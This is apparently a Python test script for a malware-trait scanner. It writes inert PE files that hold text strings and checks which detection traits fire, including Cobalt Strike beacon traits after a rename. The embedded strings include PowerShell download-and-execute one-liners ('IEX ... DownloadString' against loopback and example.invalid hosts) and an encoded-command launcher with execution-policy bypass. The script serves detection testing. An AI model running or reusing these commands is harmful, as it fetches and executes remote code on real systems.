"""Exercise native command text without executing any embedded command."""
import argparse
import json
from pathlib import Path
import struct
import subprocess
import tempfile


def pe_with_text(payload):
    """An inert PE32 containing a readable data section and no imports."""
    size = (len(payload) + 511) // 512 * 512
    data = bytearray(512 + size)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 60, 128)
    data[128:132] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", data, 132, 0x14C, 1, 1700000000, 0, 0, 224, 0x102)
    opt = 152
    struct.pack_into("<H", data, opt, 0x10B)
    struct.pack_into("<III", data, opt + 16, 4096, 4096, 4096)
    struct.pack_into("<III", data, opt + 28, 0x400000, 4096, 512)
    struct.pack_into("<II", data, opt + 56, (size + 8191) // 4096 * 4096, 512)
    struct.pack_into("<H", data, opt + 68, 3)
    struct.pack_into("<I", data, opt + 92, 16)
    struct.pack_into("<8sIIIIIIHHI", data, opt + 224, b".rdata", size,
                     4096, size, 512, 0, 0, 0, 0, 0x40000040)
    data[512:512 + len(payload)] = payload
    return data


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="cleave")
    parser.add_argument("--traits-dir", default=".")
    parser.add_argument("--beacon", type=Path,
                        help="Optional existing Beacon DLL for a rename control")
    args = parser.parse_args()
    evaluate = "micro-behaviors/process/deploy/script-eval::powershell-webclient-download-eval-text"
    loopback = "micro-behaviors/communications/http/client/managed::loopback-downloadstring-url"
    command = "micro-behaviors/process/deploy/script-eval::powershell-loopback-download-eval-command"
    launch = b"powershell -nop -exec bypass -EncodedCommand '%s'\0"
    local = b"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:8000/')\0"
    remote = local.replace(b"127.0.0.1", b"example.invalid")
    cases = [
        ("local-bootstrap", local + launch, {evaluate, loopback, command}),
        ("localhost-full-evaluator", local.replace(b"127.0.0.1", b"localhost").replace(
            b"IEX", b"Invoke-Expression") + launch, {evaluate, loopback, command}),
        ("remote-bootstrap", remote + launch, {evaluate}),
        ("loopback-looking-domain", local.replace(b"127.0.0.1", b"localhost.example.invalid")
         + launch, {evaluate}),
        ("loopback-looking-ip-domain", local.replace(b"127.0.0.1", b"127.0.0.1.example.invalid")
         + launch, {evaluate}),
        ("download-only", local.split(b".", 1)[1] + launch, {loopback}),
        ("construction-only", b"IEX (New-Object Net.Webclient)\0" + launch, set()),
        ("unrelated-distant-calls", remote + launch + b"\0" * 1024 +
         b"x.DownloadString('http://localhost:9000/')\0", {evaluate, loopback}),
        ("renameable-beacon-strings", b"beacon.dll\0_ReflectiveLoader@4\0beacon\0", set()),
    ]
    relevant = {evaluate, loopback, command}
    with tempfile.TemporaryDirectory(prefix="native-loopback-") as directory:
        paths = []
        for name, payload, _ in cases:
            path = Path(directory) / (name + ".exe")
            path.write_bytes(pe_with_text(payload))
            paths.append(str(path))
        if args.beacon:
            beacon = args.beacon.read_bytes()
            assert b"beacon.dll" in beacon
            renamed = Path(directory) / "renamed-payload.exe"
            renamed.write_bytes(beacon.replace(b"beacon.dll", b"agentx.dll"))
            paths.append(str(renamed))
        result = subprocess.run(
            [args.cleave, "--traits-dir", args.traits_dir, "--format", "json", *paths],
            text=True, capture_output=True, check=True)
        # The CLI can concatenate one compact JSON report per input path.
        decoder = json.JSONDecoder()
        remaining = result.stdout.strip()
        files = []
        while remaining:
            report, end = decoder.raw_decode(remaining)
            files.extend(report["files"])
            remaining = remaining[end:].lstrip()
        by_name = {Path(f["path"]).stem: f for f in files}
        for name, _, expected in cases:
            file = by_name[name]
            traits = file["traits"]
            matched = {t["id"] for t in traits}
            assert matched & relevant == expected, (name, matched & relevant, expected)
            hostile = [t["id"] for t in traits if t.get("crit") in (5, "hostile")]
            assert not hostile, (name, hostile)
            print(name + ": passed")
        if args.beacon:
            traits = by_name["renamed-payload"]["traits"]
            hostile = {t["id"] for t in traits if t.get("crit") in (5, "hostile")}
            assert {
                "well-known/malware/rat/cobalt-strike/beacon::windows-reflective-beacon-dll",
                "well-known/malware/rat/cobalt-strike/config::xor-encoded-config-reflective-beacon",
            } <= hostile, hostile
            print("renamed-real-beacon: passed")


if __name__ == "__main__":
    main()
